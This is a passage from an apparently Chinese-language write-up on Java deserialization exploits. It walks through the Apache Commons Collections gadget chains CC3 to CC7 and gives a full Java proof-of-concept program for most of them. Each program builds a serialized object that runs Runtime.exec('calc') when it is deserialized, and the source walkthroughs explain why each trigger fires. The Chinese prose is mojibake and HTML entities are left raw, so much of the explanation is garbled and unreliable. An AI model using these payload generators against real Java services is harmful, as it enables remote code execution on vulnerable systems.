= t.right; else return t.setValue(value); } while (t != null); } else { if (key == null) throw new NullPointerException(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) Comparable\u0026lt;? super K\u0026gt; k = (Comparable\u0026lt;? super K\u0026gt;) key; do { parent = t; cmp = k.compareTo(t.key); if (cmp \u0026lt; 0) t = t.left; else if (cmp \u0026gt; 0) t = t.right; else return t.setValue(value); } while (t != null); } Entry\u0026lt;K,V\u0026gt; e = new Entry\u0026lt;\u0026gt;(key, value, parent); if (cmp \u0026lt; 0) parent.left = e; else parent.right = e; fixAfterInsertion(e); size++; modCount++; return null; } å¯ä»¥çœ‹åˆ°è¿™é‡Œè§¦å‘äº†æˆ‘ä»¬æ„é€ çš„æ¶æ„æ’åºæ–¹æ³•ã€‚\nåé¢çš„æµç¨‹åˆ™å’ŒPriorityQueueé“¾ç›¸åŒï¼Œä¸å†èµ˜è¿°ã€‚\né—®é¢˜è¡¥å…… ç”¨toStringåˆå§‹åŒ– Qï¼š\nä¸ºä»€ä¹ˆExpä¸­çš„InvokerTransformer transformer=new InvokerTransformer(\u0026quot;toString\u0026quot;,new Class[]{},new Object[]{});â€‹ä¸ç›´æ¥ç”¨InvokerTransformer transformer=new InvokerTransformer(\u0026quot;newTransformer\u0026quot;,new Class[]{},new Object[]{});â€‹å‘¢ï¼Ÿ\nAï¼š\næˆ‘ä»¬æ„é€ çš„æ¶æ„æ’åºæ–¹æ³•å…¶å®æ˜¯ä¸èƒ½æ­£å¸¸æ’åºçš„ï¼Œå¦‚æœç”¨newTransformerä½œä¸ºå…¥å‚æ„é€ ï¼Œåˆ™åœ¨Expçš„tb.add(templatesImpl)â€‹å°±ä¼šæŠ¥é”™ï¼ŒåŸå› çœ‹æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 //TreeBagæºç  public boolean add(E object) { if (this.comparator() == null \u0026amp;\u0026amp; !(object instanceof Comparable)) { throw new IllegalArgumentException(\u0026#34;Objects of type \u0026#34; + object.getClass() + \u0026#34; cannot be added to \u0026#34; + \u0026#34;a naturally ordered TreeBag as it does not implement Comparable\u0026#34;); } else { return super.add(object); } } //AbstractTreeBagæºç  public boolean add(E object) { return this.add(object, 1); } public boolean add(E object, int nCopies) { ++this.modCount; if (nCopies \u0026gt; 0) { MutableInteger mut = (MutableInteger)this.map.get(object); this.size += nCopies; if (mut == null) { this.map.put(object, new MutableInteger(nCopies)); return true; } else { mut.value += nCopies; return false; } } else { return false; } } ç”±æºç å¯çŸ¥ï¼Œtb.add(templatesImpl)â€‹ä¼šè§¦å‘æˆ‘ä»¬çš„æ¶æ„æ’åºï¼Œå¦‚æœç”¨newTransformerä½œä¸ºå…¥å‚æ„é€ ï¼Œåˆ™æ­¤å¤„æŠ¥é”™ã€‚\nå› æ­¤å…ˆä½¿ç”¨toStringä½œä¸ºå…¥å‚æ„é€ ï¼Œä½¿ä»£ç è¿è¡Œé€šè¿‡tb.add(templatesImpl)â€‹ï¼Œåé¢å†é€šè¿‡åå°„æŠŠtoStringæ”¹ä¸ºnewTransformerã€‚\nnewTransformeræ„é€ æŠ¥é”™åŸå›  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 //TemplatesImplæºç  private Translet getTransletInstance() throws TransformerConfigurationException { try { if (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();//1 translet.postInitialization();//2 translet.setTemplates(this); translet.setOverrideDefaultParser(_overrideDefaultParser); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) { translet.setAuxiliaryClasses(_auxClasses); } return translet; } catch (InstantiationException e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } catch (IllegalAccessException e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } ç¨‹åºåœ¨æ‰§è¡Œåˆ°æ³¨é‡Š1å¤„æ—¶ï¼Œè§¦å‘äº†æˆ‘ä»¬çš„æ¶æ„ä»£ç ã€‚\nè€Œåœ¨æ³¨é‡Š2å¤„å‘ç”Ÿäº†ç©ºæŒ‡é’ˆæŠ¥é”™ï¼š\nâ€‹â€‹\nCommonsCollections3 ç‰ˆæœ¬é€‚ç”¨èŒƒå›´ Commons-Collections 3.1-3.2.1\nJava JDK \u0026lt; 8u71\nExpå±•ç¤º 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.CannotCompileException; import javassist.ClassPool; import javassist.CtClass; import javassist.NotFoundException; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import java.io.*; import java.lang.reflect.*; import java.util.HashMap; import java.util.Map; public class CommonsCollections3 { public static void main(String[] args) throws Exception { String AbstractTranslet=\u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;; String TemplatesImpl=\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;; ClassPool classPool=ClassPool.getDefault(); classPool.appendClassPath(AbstractTranslet); CtClass payload=classPool.makeClass(\u0026#34;CommonsCollections333333333\u0026#34;); payload.setSuperclass(classPool.get(AbstractTranslet)); payload.makeClassInitializer().setBody(\u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);\u0026#34;); byte[] bytes=payload.toBytecode(); Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance(); Field field=templatesImpl.getClass().getDeclaredField(\u0026#34;_bytecodes\u0026#34;); field.setAccessible(true); field.set(templatesImpl,new byte[][]{bytes}); Field field1=templatesImpl.getClass().getDeclaredField(\u0026#34;_name\u0026#34;); field1.setAccessible(true); field1.set(templatesImpl,\u0026#34;test\u0026#34;); Transformer[] transformers=new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl}) }; ChainedTransformer chainedTransformer=new ChainedTransformer(transformers); Map map=new HashMap(); Map lazyMap= LazyMap.decorate(map,chainedTransformer); Class cls=Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor=cls.getDeclaredConstructor(Class.class,Map.class); constructor.setAccessible(true); InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Override.class,lazyMap); Map map1=(Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),invocationHandler); Object object=constructor.newInstance(Override.class,map1); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;test.out\u0026#34;)); outputStream.writeObject(object); outputStream.close(); ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(\u0026#34;test.out\u0026#34;)); inputStream.readObject(); } } Expæ„é€ åˆ†æ CommonsCollections3æ˜¯CommonsCollections1å’ŒCommonsCollections2çš„ç»„åˆæ”¹é€ ç‰ˆã€‚\næ¶‰åŠçš„æ–°ç±»æœ‰InstantiateTransformerå’ŒTrAXFilterã€‚\nåˆ©ç”¨é“¾å±•ç¤º 1 2 3 4 5 6 7 8 AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform()//1 InstantiateTransformer.transform()//2 TemplatesImpl.newTransformer() å‰åŠéƒ¨åˆ†æ˜¯CommonsCollections1çš„LazyMapåˆ©ç”¨é“¾ï¼ŒååŠéƒ¨åˆ†æ˜¯CommonsCollections2çš„åˆ©ç”¨é“¾ã€‚\nTrAXFilter åœ¨åˆ©ç”¨é“¾æ³¨é‡Š1å¤„ä¼šå¾—åˆ°ä¸€ä¸ªTrAXFilterç±»ã€‚\n1 2 3 4 5 6 public TrAXFilter(Templates templates) throws TransformerConfigurationException { this._templates = templates; this._transformer = (TransformerImpl)templates.newTransformer();//1 æ¼æ´åˆ©ç”¨ç‚¹ this._transformerHandler = new TransformerHandlerImpl(this._transformer); this._useServicesMechanism = this._transformer.useServicesMechnism(); } æ ¹æ®ChainedTransformer.transform()çš„æºç å¾—çŸ¥ï¼Œè¿™ä¸ªç±»ä¼šä½œä¸ºInstantiateTransformer.transform()çš„å…¥å‚ã€‚\nInstantiateTransformer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public Object transform(Object input) { try { if (!(input instanceof Class)) { throw new FunctorException(\u0026#34;InstantiateTransformer: Input object was not an instanceof Class, it was a \u0026#34; + (input == null ? \u0026#34;null object\u0026#34; : input.getClass().getName())); } else { Constructor con = ((Class)input).getConstructor(this.iParamTypes); return con.newInstance(this.iArgs);//1 æ¼æ´åˆ©ç”¨ç‚¹ } } catch (NoSuchMethodException var6) { throw new FunctorException(\u0026#34;InstantiateTransformer: The constructor must exist and be public \u0026#34;); } catch (InstantiationException var7) { throw new FunctorException(\u0026#34;InstantiateTransformer: InstantiationException\u0026#34;, var7); } catch (IllegalAccessException var8) { throw new FunctorException(\u0026#34;InstantiateTransformer: Constructor must be public\u0026#34;, var8); } catch (InvocationTargetException var9) { throw new FunctorException(\u0026#34;InstantiateTransformer: Constructor threw an exception\u0026#34;, var9); } } this.iArgsçš„å€¼ä¸ºæˆ‘ä»¬æ„é€ çš„templatesImplï¼Œç¨‹åºåœ¨æ³¨é‡Š1å‡ºå®é™…æ‰§è¡Œçš„æ˜¯templatesImpl.newTransformer()ï¼Œåé¢çš„åˆ©ç”¨åŸç†å’ŒCommonsCollections2ç±»ä¼¼ï¼Œä¸å†èµ˜è¿°ã€‚\nCommonsCollections4 ç‰ˆæœ¬é€‚ç”¨èŒƒå›´ commons-collections4 4.0\nExpå±•ç¤º 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.*; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsCollections4 { public static void main(String[] args) throws Exception { String AbstractTranslet=\u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;; String TemplatesImpl=\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;; ClassPool classPool=ClassPool.getDefault(); classPool.appendClassPath(AbstractTranslet); CtClass payload=classPool.makeClass(\u0026#34;CommonsCollections44444444\u0026#34;); payload.setSuperclass(classPool.get(AbstractTranslet)); payload.makeClassInitializer().setBody(\u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);\u0026#34;); byte[] bytes = payload.toBytecode(); Object templates = Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance(); Field field=templates.getClass().getDeclaredField(\u0026#34;_bytecodes\u0026#34;); field.setAccessible(true); field.set(templates,new byte[][]{bytes}); Field name=templates.getClass().getDeclaredField(\u0026#34;_name\u0026#34;); name.setAccessible(true); name.set(templates,\u0026#34;test\u0026#34;); Transformer[] trans = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[]{Templates.class}, new Object[]{templates}) };// ä¸»è¦æ˜¯è¿™é‡Œçš„å˜åŒ– ChainedTransformer chain = new ChainedTransformer(trans); TransformingComparator transCom = new TransformingComparator(chain); PriorityQueue queue = new PriorityQueue(2); queue.add(1); queue.add(1); Field com = PriorityQueue.class.getDeclaredField(\u0026#34;comparator\u0026#34;); com.setAccessible(true); com.set(queue,transCom); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;test.out\u0026#34;)); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(\u0026#34;test.out\u0026#34;)); inputStream.readObject(); } } Expæ„é€ åˆ†æ å…¶å®å°±æ˜¯CommonsCollections2å’ŒCommonsCollections3çš„ç»„åˆ\nåˆ©ç”¨é“¾å±•ç¤º 1 2 3 4 5 6 7 8 9 Gadget chain: ObjectInputStream.readObject() PriorityQueue.readObject() ... TransformingComparator.compare()//1 ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() TemplatesImpl.newTransformer() æ³¨é‡Š1ä¹‹å‰æ˜¯CommonsCollections2çš„åˆ©ç”¨ã€‚\nåœ¨TransformingComparator.compare()ä¸­è§¦å‘this.transformer.transform(obj1)ï¼Œåé¢å°±æ˜¯CommonsCollections3çš„åˆ©ç”¨ã€‚\né—®é¢˜è¡¥å…… æ˜¯å¦èƒ½ç”¨TreeBag\u0026amp;TreeMapæ„é€  Qï¼š\næ˜¯å¦èƒ½ç±»ä¼¼CommonsCollections2ä¸€æ ·ï¼Œåˆ©ç”¨TreeBag\u0026amp;TreeMapæ„é€ å‘¢ï¼Ÿ\nAï¼š\næˆ‘è§‰å¾—å¾ˆéš¾ï¼Œç†ç”±å¦‚ä¸‹ï¼š\nâ€‹tb.add(templatesImpl)â€‹ä¼šè§¦å‘æˆ‘ä»¬çš„æ¶æ„æ’åºã€‚\nå› æ­¤CommonsCollections2ä¸­ï¼Œå…ˆä½¿ç”¨toStringä½œä¸ºå…¥å‚æ„é€ ï¼Œä½¿ä»£ç è¿è¡Œé€šè¿‡tb.add(templatesImpl)â€‹ï¼Œåé¢å†é€šè¿‡åå°„æŠŠtoStringæ”¹ä¸ºnewTransformerã€‚\nè€Œåœ¨æ­¤å¤„å´å¾ˆéš¾å®ç°ã€‚\næˆ‘å°è¯•ä¸ä½¿ç”¨tb.add(templatesImpl)â€‹ï¼Œè€Œä½¿ç”¨åå°„ç»™sizeå’Œmapèµ‹å€¼ï¼Œè¿™æ ·å¯ä»¥è§„é¿addçš„æ‰§è¡Œï¼Œä½†å¯ä»¥æŠŠç­‰åŒçš„çŠ¶æ€èµ‹ç»™å®ä¾‹ã€‚\nsizeå®¹æ˜“è§£å†³ï¼Œä½†æ˜¯mapå´å¾ˆéš¾è§£å†³ã€‚\næºç ä¸­mapçš„å®šä¹‰å¦‚ä¸‹ï¼š\nâ€‹ private transient Map\u0026lt;E, MutableInteger\u0026gt; map;â€‹\nMutableIntegeræ˜¯AbstractMapBagå†…éƒ¨çš„ä¸€ä¸ªprotectedç±»ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 protected static class MutableInteger { protected int value; MutableInteger(int value) { this.value = value; } public boolean equals(Object obj) { if (!(obj instanceof MutableInteger)) { return false; } else { return ((MutableInteger)obj).value == this.value; } } public int hashCode() { return this.value; } } è¿™å°±å¾ˆéš¾æäº†ï¼Œå› ä¸ºæˆ‘ä»¬æ— æ³•ä»å¤–éƒ¨è·å–åˆ°MutableIntegerã€‚\nå› æ­¤æˆ‘è®¤ä¸ºå¾ˆéš¾å†ä½¿ç”¨TreeBag\u0026amp;TreeMapæ„é€ äº†ã€‚\nCommonsCollections5 ç‰ˆæœ¬é€‚ç”¨èŒƒå›´ Commons-Collections 3.1-3.2.1\njdk without a security manager\nExpå±•ç¤º 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; public class CommonsCollections5 { public static void main(String[] args) throws Exception { Transformer Testtransformer = new ChainedTransformer(new Transformer[]{}); Transformer[] transformers=new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,new Class[]{}}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }; HashMap innermap = new HashMap(); LazyMap map = (LazyMap)LazyMap.decorate(innermap,Testtransformer); TiedMapEntry tiedmap = new TiedMapEntry(map,123); BadAttributeValueExpException poc = new BadAttributeValueExpException(123); Field val = Class.forName(\u0026#34;javax.management.BadAttributeValueExpException\u0026#34;).getDeclaredField(\u0026#34;val\u0026#34;); val.setAccessible(true); val.set(poc,tiedmap); Field field = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field.setAccessible(true); field.set(Testtransformer, transformers); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;cc5.out\u0026#34;)); outputStream.writeObject(poc); outputStream.close(); ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(\u0026#34;cc5.out\u0026#34;)); inputStream.readObject(); } } Expæ„é€ åˆ†æ åˆ©ç”¨é“¾å±•ç¤º 1 2 3 4 5 6 7 8 9 10 Gadget chain: ObjectInputStream.readObject() BadAttributeValueExpException.readObject() TiedMapEntry.toString() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Runtime.exec() BadAttributeValueExpException 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\u0026#34;val\u0026#34;, null); if (valObj == null) { val = null; } else if (valObj instanceof String) { val= valObj; } else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) { val = valObj.toString();//1 } else { // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + \u0026#34;@\u0026#34; + valObj.getClass().getName(); } } åˆ†æä¸€ä¸‹BadAttributeValueExpException.readObject()æºç ï¼Œå› ä¸ºSecurityManageræ˜¯é»˜è®¤å…³é—­çš„ï¼Œå› æ­¤System.getSecurityManager() == nullâ€‹ä¸ºçœŸï¼Œç¨‹åºä¼šæ‰§è¡Œæ³¨é‡Š1å¤„ã€‚\nåˆ†æExpï¼Œè¿™é‡Œä¼šè§¦å‘TiedMapEntry.toString()ã€‚\nTiedMapEntry 1 2 3 4 5 6 7 public String toString() { return this.getKey() + \u0026#34;=\u0026#34; + this.getValue(); } public Object getValue() { return this.map.get(this.key);//1 } ç¨‹åºåœ¨æ³¨é‡Š1å¤„ä¼šè§¦å‘LazyMap.get()ï¼Œåç»­çš„æ‰§è¡Œæµç¨‹åˆ™å’ŒCommonsCollections1ç›¸åŒã€‚\nCommonsCollections6 ç‰ˆæœ¬é€‚ç”¨èŒƒå›´ commons-collections : 3.1ï½3.2.1\nExpå±•ç¤º 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class CommonsCollections6 { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { Transformer Testtransformer = new ChainedTransformer(new Transformer[]{}); Transformer[] transformers=new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,new Class[]{}}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }; Map map=new HashMap(); Map lazyMap=LazyMap.decorate(map,Testtransformer); TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,\u0026#34;cc6\u0026#34;); HashSet hashSet=new HashSet(1); hashSet.add(tiedMapEntry); lazyMap.remove(\u0026#34;cc6\u0026#34;); //é€šè¿‡åå°„è¦†ç›–åŸæœ¬çš„iTransformersï¼Œé˜²æ­¢åºåˆ—åŒ–æ—¶åœ¨æœ¬åœ°æ‰§è¡Œå‘½ä»¤ Field field = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field.setAccessible(true); field.set(Testtransformer, transformers); ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;cc6.out\u0026#34;)); objectOutputStream.writeObject(hashSet); objectOutputStream.close(); ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(\u0026#34;cc6.out\u0026#34;)); objectInputStream.readObject(); } } Expæ„é€ åˆ†æ åˆ©ç”¨é“¾å±•ç¤º 1 2 3 4 5 6 7 HashSet.readObject()/HashMap.readObject() HashMap.put() HashMap.hash() TiedMapEntry.hashCode() LazyMap.get() ChainedTransformer.transform() InvokerTransformer.transform() HashSet 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Read in any hidden serialization magic s.defaultReadObject(); // Read capacity and verify non-negative. int capacity = s.readInt(); if (capacity \u0026lt; 0) { throw new InvalidObjectException(\u0026#34;Illegal capacity: \u0026#34; + capacity); } // Read load factor and verify positive and non NaN. float loadFactor = s.readFloat(); if (loadFactor \u0026lt;= 0 || Float.isNaN(loadFactor)) { throw new InvalidObjectException(\u0026#34;Illegal load factor: \u0026#34; + loadFactor); } // Read size and verify non-negative. int size = s.readInt(); if (size \u0026lt; 0) { throw new InvalidObjectException(\u0026#34;Illegal size: \u0026#34; + size); } // Set the capacity according to the size and load factor ensuring that // the HashMap is at least 25% full but clamping to maximum capacity. capacity = (int) Math.min(size * Math.min(1 / loadFactor, 4.0f), HashMap.MAXIMUM_CAPACITY); // Constructing the backing map will lazily create an array when the first element is // added, so check it before construction. Call HashMap.tableSizeFor to compute the // actual allocation size. Check Map.Entry[].class since it\u0026#39;s the nearest public type to // what is actually created. SharedSecrets.getJavaOISAccess() .checkArray(s, Map.Entry[].class, HashMap.tableSizeFor(capacity)); // Create backing HashMap map = (((HashSet\u0026lt;?\u0026gt;)this) instanceof LinkedHashSet ? new LinkedHashMap\u0026lt;E,Object\u0026gt;(capacity, loadFactor) : new HashMap\u0026lt;E,Object\u0026gt;(capacity, loadFactor)); // Read in all elements in the proper order. for (int i=0; i\u0026lt;size; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) E e = (E) s.readObject(); map.put(e, PRESENT);//1 } } ç¨‹åºåœ¨ååºåˆ—åŒ–æ—¶ï¼Œåœ¨æ³¨é‡Š1å¤„ï¼Œæ‰§è¡ŒHashMap.put()\nHashMap 1 2 3 4 5 6 7 public V put(K key, V value) { return putVal(hash(key), key, value, false, true); } static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u0026gt;\u0026gt;\u0026gt; 16);//1 } ç¨‹åºåœ¨æ³¨é‡Š1å¤„æ‰§è¡ŒTiedMapEntry.hashCode()\nTiedMapEntry 1 2 3 4 5 6 7 public int hashCode() { Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); } public Object getValue() { return this.map.get(this.key);//1 } ç¨‹åºåœ¨æ³¨é‡Š1å¤„è§¦å‘LazyMap.get()ã€‚\nLazyMap 1 2 3 4 5 6 7 8 9 public Object get(Object key) { if (!super.map.containsKey(key)) { Object value = this.factory.transform(key);//1 super.map.put(key, value); return value; } else { return super.map.get(key); } } ç¨‹åºåœ¨æ³¨é‡Š1å¤„ä¼šæ‰§è¡Œæˆ‘ä»¬æ¶æ„æ„é€ çš„payloadã€‚\né—®é¢˜è¡¥å…… lazyMap.remove(\u0026ldquo;cc6\u0026rdquo;) Q1ï¼š\nä¸ºä½•è¦æŠŠcc6åˆ é™¤æ‰\nA1ï¼š\nä¸»è¦å’ŒLazyMapæœ‰å…³\n1 2 3 4 5 6 7 8 9 public Object get(Object key) { if (!super.map.containsKey(key)) {//1 Object value = this.factory.transform(key); super.map.put(key, value); return value; } else { return super.map.get(key);//2 } } å¦‚æœä¸åˆ é™¤åˆ™ä¼šæ‰§è¡Œæ³¨é‡Š2ï¼Œè¿™æ ·å°±è§¦å‘ä¸äº†payloadã€‚\nQ2ï¼š\ncc6è¿™ä¸ªå€¼æ˜¯åœ¨å“ªé‡Œèµ‹å€¼ç»™lazyMapçš„å‘¢ï¼Ÿ\nA2ï¼š\nåœ¨hashSet.add(tiedMapEntry)ï¼Œè¿™ä¸ªè¿‡ç¨‹å’ŒExpåˆ©ç”¨é“¾åŸºæœ¬ä¸€æ ·ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 //HashSet public boolean add(E e) { return map.put(e, PRESENT)==null; } //HashMap public V put(K key, V value) { return putVal(hash(key), key, value, false, true); } static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u0026gt;\u0026gt;\u0026gt; 16); } //.......å’ŒExpåˆ©ç”¨é“¾ç›¸åŒ //ChainedTransformer public Object transform(Object object) { for(int i = 0; i \u0026lt; this.iTransformers.length; ++i) { object = this.iTransformers[i].transform(object); } return object;//1 } å› ä¸ºTransformer Testtransformer = new ChainedTransformer(new Transformer[]{})â€‹ï¼Œæ‰€ä»¥æ³¨é‡Š1å¤„è¿”å›cc6ã€‚\nå› æ­¤lazyMapæœ‰ä¸€ä¸ªé”®å€¼å¯¹\u0026quot;cc6\u0026quot;-\u0026gt;\u0026ldquo;cc6\u0026rdquo;ã€‚\nTesttransformer Qï¼š\nä¸ºä½•è¦å…ˆç”¨Testtransformerâ€‹æ„é€ ï¼Œå†ç”¨åå°„æ›´æ”¹iTransformersâ€‹ã€‚\nAï¼š\nå¦åˆ™ä¼šåœ¨ååºåˆ—åŒ–ä¹‹å‰è§¦å‘payloadï¼Œå¯¼è‡´ç¨‹åºä¸­æ­¢ã€‚\nCommonsCollections7 ç‰ˆæœ¬é€‚ç”¨èŒƒå›´ commons-collections : 3.1ï½3.2.1\nExpå±•ç¤º 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class CommonsCollections7 { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { Transformer chainedTransformer = new ChainedTransformer(new Transformer[]{}); Transformer[] transformers=new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,new Class[]{}}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }; Map map=new HashMap(); Map lazyMap=LazyMap.decorate(map,chainedTransformer); TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,\u0026#34;cc7\u0026#34;); Hashtable hashtable = new Hashtable(); hashtable.put(tiedMapEntry, \u0026#34;cc7\u0026#34;); lazyMap.remove(\u0026#34;cc7\u0026#34;); Field iTransformers = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); iTransformers.setAccessible(true); iTransformers.set(chainedTransformer,transformers); ObjectOutputStream objectOutputStream = new ObjectOutputStream(new 